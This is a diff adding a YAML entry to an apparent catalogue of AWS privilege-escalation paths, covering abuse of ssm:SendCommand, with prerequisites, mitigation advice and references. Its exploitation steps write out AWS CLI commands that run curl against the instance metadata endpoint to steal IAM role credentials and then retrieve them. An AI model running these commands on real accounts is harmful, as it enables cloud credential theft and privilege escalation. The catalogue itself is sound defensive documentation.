@@ -1,0 +1,52 @@
+id: ssm-002
+name: ssm:SendCommand
+category: access-resource
+services:
+- ssm
+- ec2
+description: The `ssm:SendCommand` permission allows a principal to execute commands on any EC2 instance on which they have
+  this permission, using SSM Run Command. This access is contingent on the EC2 instance having the SSM agent installed, possessing
+  the AmazonSSMManagedInstanceCore policy (or equivalent permissions), and being in a running state. If an instance has a
+  privileged IAM role attached, an attacker can abuse this permission to execute code that steals the credentials for that
+  role, thereby escalating their own permissions.
+prerequisites:
+  admin:
+  - EC2 instance must exist and be running
+  - EC2 instance must have SSM agent installed
+  - EC2 instance must have an instance profile attached to an IAM role
+  - IAM role must have AmazonSSMManagedInstanceCore policy or equivalent
+  - Target EC2 instance must have a role with administrative permissions attached
+  lateral:
+  - EC2 instance must exist and be running
+  - EC2 instance must have SSM agent installed
+  - EC2 instance must have an instance profile attached to an IAM role
+  - IAM role must have AmazonSSMManagedInstanceCore policy or equivalent
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws ssm send-command --instance-ids "i-XXXXXXXXXXX" --document-name "AWS-RunShellScript" --comment "Stealing
+      IAM credentials" --parameters commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME"]
+    description: Send a command to steal the IAM role credentials from instance metadata
+  - step: 2
+    command: aws ssm get-command-invocation --command-id @command-id --instance-id i-XXXXXXXXXXX
+    description: Retrieve the command output containing the temporary credentials
+recommendation: |
+  Restrict access to `ssm:SendCommand` using the principle of least privilege. Use the
+  Resource and Condition elements in IAM policies to limit which instances a principal
+  can run commands on and which documents they can use. Monitor use of this sensitive
+  permission using CloudSIEM detections.
+discoveredBy:
+  name: Unknown
+  organization: Unknown
+references:
+- title: IAM Vulnerable - SSM SendCommand
+  url: https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc-ssmSendCommand.tf
+relatedPaths:
+- ssm-001
+toolSupport:
+  pmapper: true
+  iamVulnerable: true
+permissions:
+  required:
+  - permission: ssm:SendCommand
+    resourceConstraints: Target EC2 instance must be in the Resource section
